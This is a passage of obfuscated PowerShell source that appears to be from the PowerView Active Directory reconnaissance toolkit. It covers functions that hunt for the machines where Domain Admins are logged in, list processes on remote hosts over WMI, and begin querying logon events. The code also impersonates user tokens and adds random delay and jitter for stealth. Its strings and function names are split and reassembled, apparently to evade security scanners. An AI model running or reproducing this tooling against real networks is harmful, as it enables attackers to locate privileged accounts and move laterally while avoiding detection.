            $TargetUsers   =  Get-DomainUser @UserSearcherArguments   |   Select-Object -ExpandProperty ('s'+'amaccountn' + 'am' + 'e' )
        }
        else {
            $GroupSearcherArguments   =   @{
                (  "{1}{0}{2}"-f 't','Iden','ity' )   = $UserGroupIdentity
                (  "{0}{1}" -f 'Recur','se' ) =  $True
            }
            if (  $PSBoundParameters[( "{2}{1}{0}"-f 'n','omai','UserD' )] ) { $GroupSearcherArguments[( "{1}{0}"-f'n','Domai' )]  =  $UserDomain }
            if ( $PSBoundParameters[( "{0}{2}{1}{3}" -f'UserSearc','as','hB','e')] ) { $GroupSearcherArguments[("{1}{0}{2}" -f 'chBa','Sear','se'  )]  =   $UserSearchBase }
            if ($PSBoundParameters[( "{1}{0}"-f'r','Serve'  )]) { $GroupSearcherArguments[("{2}{1}{0}"-f 'rver','e','S')] =  $Server }
            if (  $PSBoundParameters[( "{1}{0}{2}" -f'arc','Se','hScope')] ) { $GroupSearcherArguments[(  "{2}{0}{1}"-f'cop','e','SearchS'  )] = $SearchScope }
            if ($PSBoundParameters[("{3}{1}{0}{2}{4}"-f'ltPag','su','eSi','Re','ze'  )]  ) { $GroupSearcherArguments[( "{2}{1}{0}{3}"-f 'geSiz','tPa','Resul','e')]   =   $ResultPageSize }
            if ( $PSBoundParameters[( "{4}{1}{3}{0}{2}" -f'i','v','meLimit','erT','Ser')] ) { $GroupSearcherArguments[( "{2}{1}{3}{0}"-f'eLimit','erv','S','erTim' )]   =  $ServerTimeLimit }
            if ($PSBoundParameters[( "{2}{0}{1}"-f 'bst','one','Tom')]) { $GroupSearcherArguments[(  "{2}{0}{1}"-f'mbsto','ne','To')]  =   $Tombstone }
            if ( $PSBoundParameters[( "{0}{2}{1}" -f 'Crede','l','ntia'  )]) { $GroupSearcherArguments[( "{0}{1}{2}" -f 'Cr','edenti','al' )] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments  |  Select-Object -ExpandProperty (  'Mem'  + 'b'  +  'erName')
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ( (  -not $ShowAll ) -and ($TargetUsers.leNgtH -eq 0 )) {
            throw (  "{3}{10}{0}{8}{6}{9}{5}{4}{7}{12}{11}{2}{1}" -f 'd-D',' target','o','[Fi','o','o users f','cat','u','omainUserLo','ion] N','n','t','nd '  )
        }

        
        $HostEnumBlock   =  {
            Param( $ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle )

            if (  $TokenHandle) {
                
                $Null =   Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach (  $TargetComputer in $ComputerName ) {
                $Up   =   Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if (  $Up  ) {
                    $Sessions   =  Get-NetSession -ComputerName $TargetComputer
                    ForEach ( $Session in $Sessions ) {
                        $UserName   = $Session.uSErnamE
                        $CName = $Session.Cname

                        if ($CName -and $CName.stArtswITh(  '\\' )) {
                            $CName =   $CName.TriMStaRT( '\'  )
                        }

                        
                        if ( (  $UserName ) -and ($UserName.TRIm(    ) -ne '' ) -and ( $UserName -notmatch $CurrentUser ) -and ($UserName -notmatch '\$$') ) {

                            if ( ( -not $TargetUsers) -or ( $TargetUsers -contains $UserName)) {
                                $UserLocation   =  New-Object ('PSOb'+'je' + 'ct' )
                                $UserLocation   | Add-Member ('Noteprope'+  'rt'  +  'y'  ) ( "{2}{1}{0}"-f 'n','mai','UserDo') $Null
                                $UserLocation   |   Add-Member (  'Notepr' +'oper' + 't' + 'y') ( "{0}{2}{1}"-f 'U','me','serNa' ) $UserName
                                $UserLocation |  Add-Member ( 'Notep'  + 'r'  +'ope'  + 'rty' ) ( "{2}{1}{0}{3}" -f'erNa','ut','Comp','me'  ) $TargetComputer
                                $UserLocation   |  Add-Member ('Notep'+ 'ro' +'perty' ) (  "{0}{2}{1}"-f'SessionF','m','ro' ) $CName

                                
                                try {
                                    $CNameDNSName = [System.Net.Dns]::gETHOstentry(  $CName  )  |  Select-Object -ExpandProperty ( 'H'  + 'ostNam'+'e')
                                    $UserLocation  |   Add-Member ( 'N'+'o'+ 'teProper'+  'ty'  ) (  "{0}{2}{3}{1}"-f 'SessionF','me','ro','mNa') $CnameDNSName
                                }
                                catch {
                                    $UserLocation   |   Add-Member (  'Note'  +'P' + 'rope'  +'rty') ("{1}{0}{2}"-f 'onFrom','Sessi','Name') $Null
                                }

                                
                                if ($CheckAccess ) {
                                    $Admin =  (  Test-AdminAccess -ComputerName $CName  ).IsaDMIn
                                    $UserLocation |  Add-Member ('N'+  'oteprope' +'rt' +'y' ) (  "{2}{0}{1}" -f 'calAd','min','Lo'  ) $Admin.IsadMin
                                }
                                else {
                                    $UserLocation |   Add-Member (  'Noteprope'  +'rt' +'y' ) ("{0}{2}{1}"-f'L','alAdmin','oc' ) $Null
                                }
                                $UserLocation.pSoBJect.TyPeNAMes.iNSeRT(  0, ("{3}{0}{1}{2}{4}" -f'.User','Loca','t','PowerView','ion'  ) )
                                $UserLocation
                            }
                        }
                    }
                    if ( -not $Stealth) {
                        
                        $LoggedOn =   Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ( $User in $LoggedOn ) {
                            $UserName  =  $User.uSernamE
                            $UserDomain   =   $User.LoGoNdOmaiN

                            
                            if (  ($UserName ) -and ($UserName.tRIM(  ) -ne ''  )  ) {
                                if ( ( -not $TargetUsers ) -or ( $TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$' )  ) {
                                    $IPAddress =  @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IpaDDrESS
                                    $UserLocation = New-Object ( 'P'  +'SObj'+  'ect')
                                    $UserLocation   | Add-Member (  'Noteprope'+  'r'+  'ty' ) ( "{2}{1}{0}"-f 'ain','serDom','U') $UserDomain
                                    $UserLocation |   Add-Member (  'Noteprop' + 'er' + 'ty') (  "{1}{0}{2}"-f'e','Us','rName') $UserName
                                    $UserLocation   |  Add-Member ('N' +'ot'+  'epro'+'perty'  ) ( "{0}{3}{2}{1}"-f'Comp','erName','t','u'  ) $TargetComputer
                                    $UserLocation  |  Add-Member ( 'N' +  'otepro' +  'perty'  ) ("{0}{1}{2}" -f'IPAddr','e','ss') $IPAddress
                                    $UserLocation | Add-Member ('Notepro'+'per'+ 'ty') (  "{0}{1}{2}"-f'Se','ssionF','rom'  ) $Null
                                    $UserLocation   | Add-Member ( 'Not'+  'e' + 'propert'  +  'y'  ) (  "{0}{4}{3}{1}{2}"-f 'Ses','a','me','nFromN','sio' ) $Null

                                    
                                    if (  $CheckAccess  ) {
                                        $Admin  = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation |  Add-Member ( 'Note'+  'prop'  +  'er'+  'ty'  ) (  "{1}{3}{0}{2}"-f'Admi','Lo','n','cal' ) $Admin.ISAdmIn
                                    }
                                    else {
                                        $UserLocation   |   Add-Member ( 'No'+ 'teproper' + 't'+  'y' ) (  "{1}{0}{2}" -f 'calA','Lo','dmin' ) $Null
                                    }
                                    $UserLocation.psobjEct.TyPEnaMEs.insErt(0, ("{2}{1}{4}{0}{3}{5}" -f'U','Vi','Power','serL','ew.','ocation' ) )
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle ) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken   =  $Null
        if (  $PSBoundParameters[(  "{0}{1}{2}" -f 'Cre','denti','al'  )] ) {
            if ($PSBoundParameters[("{0}{1}"-f'Dela','y'  )] -or $PSBoundParameters[("{2}{1}{0}{3}" -f 'c','pOnSuc','Sto','ess'  )] ) {
                $LogonToken =   Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken  =   Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{0}{1}"-f 'D','elay'  )] -or $PSBoundParameters[("{4}{0}{2}{3}{1}"-f'top','cess','O','nSuc','S' )]  ) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ( '[F' +  'ind-Doma'  +'inU'+  'serLocati' + 'on] ' + 'De'  +  'l' +  'ay: '+"$Delay, "+  'J'+'itter'+  ': '  +  "$Jitter")
            $Counter   = 0
            $RandNo  =  New-Object (  'Sy' +'ste' +  'm.Rando'  + 'm')

            ForEach (  $TargetComputer in $TargetComputers  ) {
                $Counter = $Counter  +   1

                
                Start-Sleep -Seconds $RandNo.NExT(( 1-$Jitter )*$Delay, (1  +$Jitter )*$Delay  )

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose (  "{0}{1}{5}{8}{7}{9}{3}{4}{10}{2}{6}"-f'[F','ind-','r found, r','ation] Ta','rget us','D','eturning early','inUserLo','oma','c','e'  )
                    return
                }
            }
        }
        else {
            Write-Verbose ('[F'  + 'ind-' +  'D' +'omain' + 'User' +'Lo'  + 'cation]'  +' '  +  'U'+ 'sing '+'thre'+  'adi' +  'ng '+'with'  +  ' '  +'th'+ 'read'  +'s: ' +  "$Threads"  )
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            $ScriptParams  =   @{
                ("{1}{0}{2}"-f 'arget','T','Users'  )  = $TargetUsers
                ( "{2}{0}{1}"-f 'urrentU','ser','C' )   =   $CurrentUser
                (  "{2}{1}{0}"-f'th','eal','St') =  $Stealth
                ("{2}{0}{1}"-f'kenHan','dle','To' )   =  $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if (  $LogonToken  ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function FinD`-do`mAinp`R`oce`SS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{3}{0}{1}{2}"-f'Pr','o','cess','PSShould'}, '' )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{4}{5}{1}{2}{3}{0}" -f 'e','r','edential','Typ','PSUse','PSC'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{7}{6}{8}{5}{3}{1}{0}{4}" -f 'extForPassw','inT','PSA','gPla','ord','in','U','void','s'}, ''  )]
    [OutputType( {"{0}{3}{1}{2}{4}"-f 'Po','View','.UserProces','wer','s'}  )]
    [CmdletBinding(  DefauLTPARAMetErsETNAme  =  {"{1}{0}" -f 'one','N'}  )]
    Param( 
        [Parameter(  pOsiTIOn   =   0, valUeFrOmPIpEline   = $True, vAluEFrOMPIpELiNEBYpRoperTyNaMe  =  $True )]
        [Alias({"{0}{1}{2}" -f 'D','NSHos','tName'} )]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerSearchBase,

        [Alias(  {"{3}{1}{2}{0}{4}"-f 'raine','c','onst','Un','d'} )]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{0}{4}{3}{2}{1}"-f 'Oper','em','gSyst','tin','a'} )]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'r','Se','vicePack'} )]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{1}"-f'Sit','eName'})]
        [String]
        $ComputerSiteName,

        [Parameter(pARamETERsetnAMe   = "T`ArGetp`RoceSS")]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ProcessName,

        [Parameter(PArAMETERSetNAme = "tAR`G`e`TUseR" )]
        [Parameter( PaRAMeTERSETNAME   =  "u`sERI`DENT`ITy")]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $UserIdentity,

        [Parameter(  PaRAMETERsEtNAmE =   "tARgEtu`S`Er" )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $UserDomain,

        [Parameter(  pARAMEtERSEtnAME   =  "TAR`g`eTUsER"  )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $UserLDAPFilter,

        [Parameter(pArameTeRsEtnAme =   "tA`R`GeTuseR" )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{0}{1}{2}" -f'Group','Nam','e'}, {"{1}{0}" -f 'up','Gro'}  )]
        [String[]]
        $UserGroupIdentity  =  ( "{1}{3}{0}{2}" -f 'n','Do','s','main Admi'),

        [Parameter(  paraMEtERSETnaME  = "taRg`e`TUs`Er" )]
        [Alias(  {"{1}{2}{0}"-f 'unt','Ad','minCo'}  )]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{0}{2}{1}{3}{4}"-f'DomainCo','t','n','rol','ler'}  )]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{0}{1}" -f'Le','vel','One'}, {"{1}{0}"-f 'btree','Su'} )]
        [String]
        $SearchScope  =   ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize   =   200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  = [Management.Automation.PSCredential]::EMpTY,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay   =  0,

        [ValidateRange(0.0, 1.0 )]
        [Double]
        $Jitter   =  .3,

        [Int]
        [ValidateRange(  1, 100  )]
        $Threads  = 20
      )

    BEGIN {
        $ComputerSearcherArguments = @{
            ( "{0}{1}{2}" -f'Propert','i','es')  = ("{0}{2}{1}" -f 'd','hostname','ns' )
        }
        if (  $PSBoundParameters[("{1}{0}" -f 'omain','D')]) { $ComputerSearcherArguments[( "{1}{0}"-f'omain','D')]   =   $Domain }
        if ( $PSBoundParameters[( "{2}{1}{3}{0}"-f 'ain','mpute','Co','rDom' )]  ) { $ComputerSearcherArguments[(  "{1}{0}"-f'main','Do' )]  =   $ComputerDomain }
        if ( $PSBoundParameters[( "{2}{0}{4}{1}{5}{3}"-f 'omput','rLDA','C','ter','e','PFil' )]  ) { $ComputerSearcherArguments[(  "{2}{0}{1}"-f'APFilt','er','LD')] =   $ComputerLDAPFilter }
        if ($PSBoundParameters[( "{2}{4}{0}{1}{3}"-f 'rSear','c','Comput','hBase','e'  )]) { $ComputerSearcherArguments[("{2}{0}{1}" -f'ch','Base','Sear')] = $ComputerSearchBase }
        if ( $PSBoundParameters[("{2}{0}{1}"-f'nstr','ained','Unco' )] ) { $ComputerSearcherArguments[(  "{4}{3}{2}{1}{0}" -f 'ained','tr','ns','o','Unc')]   =   $Unconstrained }
        if ( $PSBoundParameters[( "{0}{1}{5}{3}{4}{2}{6}" -f 'Com','p','y','Operatin','gS','uter','stem'  )]) { $ComputerSearcherArguments[(  "{0}{4}{1}{3}{2}"-f'Ope','t','m','ingSyste','ra')]   =   $OperatingSystem }
        if ($PSBoundParameters[(  "{3}{2}{1}{0}{4}"-f 'ceP','i','uterServ','Comp','ack'  )]  ) { $ComputerSearcherArguments[("{3}{2}{0}{1}" -f'c','k','a','ServiceP')]  = $ServicePack }
        if ( $PSBoundParameters[(  "{3}{0}{1}{2}"-f'i','teNam','e','ComputerS' )]  ) { $ComputerSearcherArguments[( "{1}{0}" -f'e','SiteNam' )]   =  $SiteName }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Se','rve','r'  )]) { $ComputerSearcherArguments[( "{1}{2}{0}" -f 'r','S','erve')] =  $Server }
        if ( $PSBoundParameters[(  "{0}{1}{2}"-f'S','earchSc','ope' )]  ) { $ComputerSearcherArguments[("{2}{1}{0}"-f'Scope','arch','Se' )]  =  $SearchScope }
        if ( $PSBoundParameters[("{0}{1}{4}{2}{3}"-f'Re','sul','Pa','geSize','t')] ) { $ComputerSearcherArguments[("{0}{3}{4}{1}{2}" -f'R','PageSiz','e','es','ult')] = $ResultPageSize }
        if ($PSBoundParameters[( "{0}{2}{1}{3}" -f'S','rverTim','e','eLimit' )]) { $ComputerSearcherArguments[(  "{1}{0}{2}" -f'erverT','S','imeLimit' )] =  $ServerTimeLimit }
        if ( $PSBoundParameters[("{1}{2}{0}"-f 'ne','Tomb','sto' )]  ) { $ComputerSearcherArguments[("{2}{1}{0}" -f 'ne','to','Tombs')] = $Tombstone }
        if ($PSBoundParameters[( "{2}{1}{0}" -f'dential','re','C')]) { $ComputerSearcherArguments[( "{1}{0}{2}" -f 'ede','Cr','ntial' )]  = $Credential }

        $UserSearcherArguments  = @{
            (  "{1}{3}{2}{0}"-f's','P','rtie','rope'  ) =  ("{2}{4}{0}{3}{1}"-f'ac','e','sa','countnam','m')
        }
        if (  $PSBoundParameters[(  "{2}{1}{0}"-f'tity','erIden','Us')]  ) { $UserSearcherArguments[("{0}{2}{1}" -f'Id','y','entit' )]  =   $UserIdentity }
        if ( $PSBoundParameters[("{1}{0}"-f'in','Doma')]  ) { $UserSearcherArguments[( "{1}{0}" -f'in','Doma'  )]   =  $Domain }
        if ($PSBoundParameters[("{0}{2}{1}"-f'UserDo','in','ma')]  ) { $UserSearcherArguments[( "{2}{0}{1}"-f'omai','n','D' )]   =  $UserDomain }
        if ($PSBoundParameters[( "{3}{4}{2}{0}{1}"-f't','er','l','UserLDAPF','i'  )] ) { $UserSearcherArguments[( "{0}{2}{1}"-f'LDAP','ilter','F')]  = $UserLDAPFilter }
        if ($PSBoundParameters[("{1}{2}{4}{3}{0}"-f 'e','Use','rS','hBas','earc')]) { $UserSearcherArguments[( "{0}{2}{1}{3}"-f'S','archB','e','ase'  )]   = $UserSearchBase }
        if ($PSBoundParameters[( "{2}{1}{0}"-f 'unt','minCo','UserAd'  )]  ) { $UserSearcherArguments[("{1}{3}{2}{0}"-f 't','Adm','oun','inC')]   =   $UserAdminCount }
        if ( $PSBoundParameters[("{1}{0}" -f'rver','Se'  )] ) { $UserSearcherArguments[(  "{0}{1}"-f'Serv','er'  )]   = $Server }
        if (  $PSBoundParameters[( "{0}{1}{2}"-f'SearchS','cop','e' )]) { $UserSearcherArguments[("{3}{1}{0}{2}"-f'arch','e','Scope','S' )] = $SearchScope }
        if ($PSBoundParameters[("{3}{2}{0}{1}"-f'PageSiz','e','lt','Resu' )] ) { $UserSearcherArguments[( "{0}{1}{2}{3}" -f 'Res','u','ltPageSi','ze')] =  $ResultPageSize }
        if (  $PSBoundParameters[("{4}{3}{2}{0}{1}" -f'm','it','erTimeLi','erv','S')] ) { $UserSearcherArguments[(  "{2}{0}{1}{3}" -f 'rT','imeLimi','Serve','t'  )]  = $ServerTimeLimit }
        if (  $PSBoundParameters[( "{0}{1}{2}"-f'T','o','mbstone')] ) { $UserSearcherArguments[( "{2}{0}{1}"-f 'ombst','one','T')]   =  $Tombstone }
        if ($PSBoundParameters[(  "{0}{1}{2}{3}"-f'C','r','ede','ntial' )]) { $UserSearcherArguments[("{1}{2}{0}"-f'tial','Crede','n' )]  =  $Credential }


        
        if ($PSBoundParameters[("{2}{1}{0}" -f 'e','Nam','Computer')]) {
            $TargetComputers  =  $ComputerName
        }
        else {
            Write-Verbose ("{0}{1}{2}{4}{6}{3}{10}{5}{7}{8}{9}"-f '[Find','-Doma','inProces','g ','s] Qu','ut','eryin','ers in the ','dom','ain','comp'  )
            $TargetComputers  =  Get-DomainComputer @ComputerSearcherArguments   |   Select-Object -ExpandProperty ( 'dns'  + 'hos'+  'tname')
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if ( $TargetComputers.leNGTh -eq 0  ) {
            throw ( "{8}{6}{9}{1}{3}{0}{10}{2}{4}{11}{7}{5}"-f 'ce','n',' No hosts fo','Pro','und ','numerate','Find-Do','o e','[','mai','ss]','t')
        }

        
        if ( $PSBoundParameters[( "{2}{3}{0}{1}" -f 's','sName','Pro','ce'  )]  ) {
            $TargetProcessName   =  @()
            ForEach (  $T in $ProcessName  ) {
                $TargetProcessName += $T.SPLiT( ',' )
            }
            if ($TargetProcessName -isnot [System.Array]  ) {
                $TargetProcessName  = [String[]] @($TargetProcessName )
            }
        }
        elseif (  $PSBoundParameters[("{1}{0}{3}{2}"-f 'er','Us','ty','Identi')] -or $PSBoundParameters[( "{4}{1}{3}{2}{0}"-f'ter','P','l','Fi','UserLDA'  )] -or $PSBoundParameters[("{0}{4}{2}{1}{3}"-f'Us','hBas','rSearc','e','e')] -or $PSBoundParameters[(  "{1}{0}{2}{3}" -f 'se','U','rAd','minCount'  )] -or $PSBoundParameters[(  "{1}{2}{4}{0}{3}" -f 'l','U','s','owDelegation','erAl'  )]) {
            $TargetUsers   = Get-DomainUser @UserSearcherArguments   |  Select-Object -ExpandProperty (  'samaccoun' +  'tn'  +  'ame'  )
        }
        else {
            $GroupSearcherArguments =  @{
                ( "{2}{1}{0}" -f'y','tit','Iden')   =  $UserGroupIdentity
                (  "{0}{1}" -f 'Recur','se'  ) =   $True
            }
            if (  $PSBoundParameters[("{2}{1}{0}" -f 'ain','erDom','Us'  )]) { $GroupSearcherArguments[("{0}{1}"-f 'Dom','ain')]   =  $UserDomain }
            if ($PSBoundParameters[( "{3}{1}{0}{2}" -f 'Bas','h','e','UserSearc'  )]  ) { $GroupSearcherArguments[( "{1}{2}{0}" -f 'se','Sea','rchBa')]   =  $UserSearchBase }
            if ( $PSBoundParameters[( "{2}{0}{1}" -f 'rve','r','Se' )] ) { $GroupSearcherArguments[( "{2}{1}{0}" -f'rver','e','S'  )] =  $Server }
            if ($PSBoundParameters[(  "{0}{2}{1}"-f 'Search','pe','Sco')]) { $GroupSearcherArguments[("{0}{2}{1}" -f 'Se','e','archScop')]   =   $SearchScope }
            if ($PSBoundParameters[( "{1}{3}{2}{0}" -f 'Size','Res','e','ultPag')]) { $GroupSearcherArguments[( "{0}{2}{3}{1}" -f 'Res','ze','ultPage','Si'  )] =   $ResultPageSize }
            if ($PSBoundParameters[("{0}{2}{1}" -f 'Ser','TimeLimit','ver' )] ) { $GroupSearcherArguments[(  "{3}{1}{0}{2}{4}"-f'rver','e','T','S','imeLimit' )]  =   $ServerTimeLimit }
            if ( $PSBoundParameters[( "{0}{1}{2}" -f'T','ombston','e' )]  ) { $GroupSearcherArguments[("{1}{2}{0}" -f 'tone','T','ombs'  )]   =  $Tombstone }
            if (  $PSBoundParameters[( "{3}{0}{2}{1}"-f 't','al','i','Creden'  )]  ) { $GroupSearcherArguments[( "{2}{1}{0}"-f'ntial','e','Cred')]   =  $Credential }
            $GroupSearcherArguments
            $TargetUsers  =  Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty ( 'Me'+'mberNa'  + 'me'  )
        }

        
        $HostEnumBlock =  {
            Param( $ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach (  $TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ( $Up ) {
                    
                    
                    if (  $Credential  ) {
                        $Processes  = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction (  'Si' +  'l'+ 'ently' +  'C' + 'ontinue')
                    }
                    else {
                        $Processes =  Get-WMIProcess -ComputerName $TargetComputer -ErrorAction ('Sile' +  'ntlyCon'  + 'tin'+'u'  +'e'  )
                    }
                    ForEach ( $Process in $Processes) {
                        
                        if (  $ProcessName  ) {
                            if (  $ProcessName -Contains $Process.PRoCESSNAMe ) {
                                $Process
                            }
                        }
                        
                        elseif (  $TargetUsers -Contains $Process.UsEr) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ( $PSBoundParameters[(  "{1}{0}"-f 'y','Dela'  )] -or $PSBoundParameters[(  "{0}{1}{3}{2}{4}" -f'Stop','OnSu','s','cce','s' )]  ) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ( '[' +'Find'+  '-D' +  'omain'  +'Proc'+'ess] '  +  'De' +  'lay: '+"$Delay, "+'Jitt'+ 'er:'+' '+"$Jitter" )
            $Counter  =  0
            $RandNo   = New-Object (  'Sy'+ 'stem.' +  'Random')

            ForEach ($TargetComputer in $TargetComputers  ) {
                $Counter  = $Counter  +   1

                
                Start-Sleep -Seconds $RandNo.nEXt( (1-$Jitter )*$Delay, (1 +  $Jitter)*$Delay )

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result  =   Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if (  $Result -and $StopOnSuccess ) {
                    Write-Verbose ("{12}{4}{2}{1}{11}{15}{9}{7}{6}{8}{3}{13}{5}{14}{10}{0}"-f 'rly','rocess] T','inP','etur','-Doma',' ',' ',',','r','nd','a','arget','[Find','ning','e',' user fou' )
                    return
                }
            }
        }
        else {
            Write-Verbose ('[Fi' +'n'  + 'd-Domai'+  'nP'  +'roce'+'ss] '  + 'U'  + 'sing' +  ' '  +'thread'+  'in' +'g '  +'w' +  'ith '  + 't'  +  'h'  + 'reads: ' +  "$Threads" )

            
            $ScriptParams  = @{
                (  "{0}{1}{2}"-f'Proc','e','ssName' )   =  $TargetProcessName
                (  "{2}{1}{0}" -f'tUsers','arge','T'  )   =   $TargetUsers
                (  "{1}{0}{2}"-f 'e','Cred','ntial') = $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function finD-d`OMaIn`USerEV`ENt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{3}{4}{0}{1}{2}" -f'ldPr','o','cess','P','SShou'}, '' )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{2}{6}{5}{4}{0}{1}{3}"-f 'me','nt','PSUseDe','s','nAssign','laredVarsMoreTha','c'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{1}{3}{0}{2}"-f 'ia','se','lType','PSCredent','PSU'}, '' )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{8}{1}{5}{0}{7}{3}{6}{4}{2}" -f'i','SAv','rd','inTextFor','sswo','o','Pa','dUsingPla','P'}, '' )]
    [OutputType(  {"{1}{0}{3}{2}" -f'rV','Powe','t','iew.LogonEven'})]
    [OutputType({"{0}{5}{6}{2}{1}{4}{3}{7}{8}"-f 'Po','ew.','i','rede','ExplicitC','wer','V','n','tialLogon'})]
    [CmdletBinding( dEfaUlTPArameTerSEtName   =  {"{1}{0}"-f'omain','D'} )]
    Param(  
        [Parameter(PaRaMETeRseTnAMe  = "coMPu`TerN`AME", PosITIOn  =   0, vALUEFRoMPIPeLiNE  =  $True, VaLueFRomPIPElINeByPROpErTynaME  = $True)]
        [Alias( {"{0}{2}{1}"-f'dn','tname','shos'}, {"{2}{0}{1}" -f 'am','e','HostN'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $ComputerName,

        [Parameter( parAmEtErsetNAME  =   "dOM`AiN"  )]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Hashtable]
        $Filter,

        [Parameter(VALueFRompiPElINEBYProPerTYnaME =   $True )]
        [ValidateNotNullOrEmpty(  )]
        [DateTime]
        $StartTime   =   [DateTime]::Now.aDDDaYS(  -1  ),

        [Parameter( valueFRomPipELInEbYPROPerTyNAme   =   $True)]
        [ValidateNotNullOrEmpty(    )]
        [DateTime]
        $EndTime   =   [DateTime]::noW,

        [ValidateRange(1, 1000000  )]
        [Int]
        $MaxEvents =   5000,

        [ValidateNotNullOrEmpty( )]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty( )]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty( )]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{2}{0}{1}" -f 'pNa','me','Grou'}, {"{0}{1}"-f'Gr','oup'}  )]
        [String[]]
        $UserGroupIdentity = (  "{0}{2}{3}{1}" -f'Domain Ad','s','mi','n' ),

        [Alias({"{2}{0}{1}" -f 'minC','ount','Ad'} )]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{1}{4}{3}{2}{0}" -f'ler','Domain','l','tro','Con'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f 'e','Bas'}, {"{2}{1}{0}"-f'Level','e','On'}, {"{1}{2}{0}" -f'tree','S','ub'}  )]
        [String]
        $SearchScope  = ( "{0}{1}" -f'Su','btree' ),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  =  [Management.Automation.PSCredential]::empTy,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay  =  0,

